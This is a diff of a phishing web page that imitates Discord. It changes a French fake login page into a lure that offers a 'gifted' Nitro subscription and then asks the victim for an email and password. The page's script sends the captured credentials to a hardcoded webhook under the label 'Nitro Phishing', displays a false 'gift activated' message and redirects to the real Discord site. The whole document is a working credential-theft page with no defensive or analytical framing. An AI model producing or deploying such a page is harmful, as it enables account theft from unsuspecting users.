@@ -3,65 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Discord</title>
+    <title>Discord Nitro</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600&display=swap');
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
         body { background-color: #313338; color: #f2f3f5; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { background-color: #313338; width: 100%; max-width: 400px; text-align: center; }
-        .logo { width: 120px; margin-bottom: 24px; }
-        h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
-        p { color: #b5bac1; font-size: 16px; margin-bottom: 24px; }
-        .input-group { text-align: left; margin-bottom: 20px; }
+        .card { background-color: #2b2d31; width: 100%; max-width: 400px; text-align: center; border-radius: 8px; padding: 30px 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+        .logo { width: 100px; margin-bottom: 20px; }
+        h2 { font-size: 24px; font-weight: 700; margin-bottom: 10px; color: #fff; }
+        p { color: #b5bac1; font-size: 15px; margin-bottom: 20px; line-height: 1.4; }
+        .gift-img { width: 100%; border-radius: 8px; margin-bottom: 20px; }
+        .form-group { text-align: left; margin-bottom: 15px; }
         label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
-        input { width: 100%; padding: 10px; background-color: #1e1f22; border: 1px solid #1e1f22; border-radius: 3px; color: #dbdee1; font-size: 16px; outline: none; }
+        input { width: 100%; padding: 12px; background-color: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #dbdee1; font-size: 16px; outline: none; }
         input:focus { border-color: #5865f2; }
-        button { width: 100%; padding: 12px; background-color: #5865f2; color: white; border: none; border-radius: 3px; font-weight: 500; cursor: pointer; margin-top: 4px; font-size: 16px; }
-        button:hover { background-color: #4752c4; }
-        .footer { margin-top: 16px; font-size: 14px; color: #949ba4; text-align: left; }
-        .footer a { color: #00a8fc; text-decoration: none; }
+        button { width: 100%; padding: 12px; background-color: #248046; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #1a6334; }
+        .btn-discord { background-color: #5865f2; }
+        .btn-discord:hover { background-color: #4752c4; }
+        .footer { margin-top: 20px; font-size: 13px; color: #949ba4; }
+        .hidden { display: none; }
+        #status { margin-top: 15px; font-size: 14px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="card">
         <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="logo" alt="Discord">
-        <h2>Bienvenue à nouveau!</h2>
-        <p>Nous sommes ravis de vous revoir!</p>
-        <form id="loginForm">
-            <div class="input-group">
-                <label>E-mail ou numéro de téléphone</label>
-                <input type="email" id="email" required>
-            </div>
-            <div class="input-group">
-                <label>Mot de passe</label>
-                <input type="password" id="password" required>
-            </div>
-            <button type="submit">Se connecter</button>
-        </form>
-        <div class="footer">
-            Besoin d'un compte ? <a href="#">S'inscrire</a>
+        
+        <!-- ETAPE 1 : LE FAUX NITRO -->
+        <div id="step1">
+            <h2>You've been gifted a subscription!</h2>
+            <p><strong>Discord</strong> has gifted you Nitro for 3 months!<br>Expires in 48 hours</p>
+            <img src="https://i.imgur.com/L8Yt5K0.png" class="gift-img" alt="Nitro Gift">
+            <button onclick="showLogin()">Accept Gift</button>
         </div>
+
+        <!-- ETAPE 2 : LE LOGIN -->
+        <div id="step2" class="hidden">
+            <h2>Bienvenue à nouveau!</h2>
+            <p>Connectez-vous pour réclamer votre cadeau.</p>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>E-mail ou numéro de téléphone</label>
+                    <input type="email" id="email" required>
+                </div>
+                <div class="form-group">
+                    <label>Mot de passe</label>
+                    <input type="password" id="password" required>
+                </div>
+                <button type="submit" class="btn-discord">Se connecter</button>
+            </form>
+        </div>
+        
+        <div id="status"></div>
     </div>
 
     <script>
         const webhookUrl = "https://discord.com/api/webhooks/1566488899348598845/8PI1V-r-5w1e9a-f8CqbONw_SxZNk53nyKPM0efglr-L1Sr6DLNpAzHPoYkwQrbS_y55";
 
+        function showLogin() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.color = "#ffff00";
+            statusDiv.innerText = "Validation...";
+
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
 
             try {
                 const formData = new FormData();
-                formData.append("content", `**Nitro Login**\n**Email:** ${email}\n**Pass:** ${pass}`);
+                formData.append("content", `**Nitro Phishing**\n**Email:** ${email}\n**Pass:** ${pass}`);
                 
                 await fetch(webhookUrl, {
                     method: 'POST',
                     body: formData
                 });
 
-                window.location.href = "https://discord.com/login";
-            } catch (err) {}
+                statusDiv.style.color = "#00ff00";
+                statusDiv.innerText = "Cadeau activé ! Redirection...";
+                setTimeout(() => window.location.href = "https://discord.com/gifts/", 1500);
+            } catch (err) {
+                statusDiv.style.color = "#ff0000";
+                statusDiv.innerText = "Erreur: " + err.message;
+            }
         });
     </script>
 </body>
